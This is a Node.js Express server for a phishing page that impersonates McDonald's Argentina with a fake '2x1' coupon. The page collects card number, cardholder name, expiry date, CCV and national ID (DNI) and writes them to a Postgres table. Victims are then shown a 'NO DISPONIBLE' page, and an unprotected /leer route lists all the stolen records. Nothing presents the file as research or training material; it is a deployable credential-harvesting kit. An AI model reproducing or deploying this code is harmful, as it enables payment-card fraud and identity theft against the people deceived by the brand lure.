const express = require("express");
const { Pool } = require("pg");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

async function crearTabla() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS registros (
      id SERIAL PRIMARY KEY,
      input1 TEXT,
      input2 TEXT,
      input3 TEXT,
      input4 TEXT,
      input5 TEXT,
      input6 TEXT,
      fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);
}

crearTabla();

app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Cupon 2x1 - McDonals</title>
	<link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="css/estilos.css">
</head>
<body>
	<div class="contenedor">
<img src="img/logo.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->
		<section class="tarjeta" id="tarjeta">
			<div class="delantera">
				<div class="logo-marca" id="logo-marca">
					<!-- <img src="img/logos/visa.png" alt=""> -->
				</div>
				<img src="img/chip-tarjeta.png" class="chip" alt="">
				<div class="datos">
					<div class="grupo" id="numero">
						<p class="label">Número Tarjeta - Credito y Debito</p>
						<p class="numero">#### #### #### ####</p>
					</div>
					<div class="flexbox">
						<div class="grupo" id="nombre">
							<p class="label">Nombre Tarjeta</p>
							<p class="nombre">Jhon Doe</p>
						</div>

						<div class="grupo" id="expiracion">
							<p class="label">Expiracion</p>
							<p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
						</div>
					</div>
				</div>
			</div>

			<div class="trasera">
				<div class="barra-magnetica"></div>
				<div class="datos">
					<div class="grupo" id="firma">
						<p class="label">Firma</p>
						<div class="firma"><p></p></div>
					</div>
					<div class="grupo" id="ccv">
						<p class="label">CCV</p>
						<p class="ccv"></p>
					</div>
				</div>
				<p class="leyenda">Lorem ipsum dolor sit amet consectetur adipisicing elit. Accusamus exercitationem, voluptates illo.</p>
				<a href="https://www.mcdonalds.com.ar/" class="link-banco">Mc Donals</a>
			</div>
		</section>

		<!-- Contenedor Boton Abrir Formulario -->
		<div class="contenedor-btn">
				<i class="fas fa-plus"></i>
			</button>
		</div>

		<!-- Formulario -->
		<form action="/guardar" method="post" id="formulario-tarjeta" class="formulario-tarjeta active">
			<div class="grupo">
				<label for="inputNumero">Número Tarjeta</label>
				<input type="text" name="input1" id="inputNumero" maxlength="19" autocomplete="off">
			</div>
			<div class="grupo">
				<label for="inputNombre">Nombre</label>
				<input type="text" name="input2" id="inputNombre" maxlength="19" autocomplete="off">
			</div>
			<div class="flexbox">
				<div class="grupo expira">
					<label for="selectMes">Expiracion</label>
					<div class="flexbox">
						<div class="grupo-select">
							<select name="input3" id="selectMes">
								<option disabled selected>Mes</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
						<div class="grupo-select">
							<select name="input4" id="selectYear">
								<option disabled selected>Año</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
					</div>
				</div>

				<div class="grupo ccv">
					<label for="inputCCV">CCV</label>
					<input type="text" name="input5" id="inputCCV" maxlength="3">
				</div>
			</div>
					<div class="grupo">
				<label for="inputDNI">DNI</label>
				<input type="number" id="inputDNI" name="inputy6" maxlength="8" autocomplete="off">
			</div>
			<button type="submit" class="btn-enviar">Canjear</button>
					<img src="img/logocre.png" alt="Mc Donals" width="150">		<!-- Tarjeta -->

		</form>

	</div>

	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
	<script src="js/main.js"></script>
</body>
</html>  `);
});

app.post("/guardar", async (req, res) => {
  const { input1, input2, input3, input4, input5, input6 } = req.body;

  await pool.query(
    `
    INSERT INTO registros 
    (input1, input2, input3, input4, input5, input6)
    VALUES ($1, $2, $3, $4, $5, $6)
    `,
    [input1, input2, input3, input4, input5, input6]
  );

  res.send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>No disponible</title>
<style>
body {
  font-family: Arial;
  background: #f2f2f2;
  height: 100vh;
  margin: 0;
  display: flex;
  justify-content: center;
  align-items: center;
}
.cartel {
  background: white;
  padding: 40px;
  border-radius: 12px;
  box-shadow: 0 0 15px rgba(0,0,0,.2);
}
</style>
</head>
<body>
  <div class="cartel">
    <h1>NO DISPONIBLE</h1>
  </div>
</body>
</html>
  `);
});

app.get("/leer", async (req, res) => {
  const resultado = await pool.query(`
    SELECT * FROM registros 
    ORDER BY id DESC
  `);

  let filas = "";

  resultado.rows.forEach(r => {
    filas += `
      <tr>
        <td>${r.id}</td>
        <td>${r.input1}</td>
        <td>${r.input2}</td>
        <td>${r.input3}</td>
        <td>${r.input4}</td>
        <td>${r.input5}</td>
        <td>${r.input6}</td>
        <td>${r.fecha}</td>
      </tr>
    `;
  });

  res.send(`
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Registros</title>
<style>
body {
  font-family: Arial;
  padding: 20px;
}
table {
  border-collapse: collapse;
  width: 100%;
}
td, th {
  border: 1px solid #ccc;
  padding: 8px;
}
th {
  background: #eee;
}
</style>
</head>
<body>
  <h2>Registros guardados</h2>

  <table>
    <tr>
      <th>ID</th>
      <th>Input 1</th>
      <th>Input 2</th>
      <th>Input 3</th>
      <th>Input 4</th>
      <th>Input 5</th>
      <th>Input 6</th>
      <th>Fecha</th>
    </tr>
    ${filas}
  </table>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Servidor activo en puerto " + PORT);
});
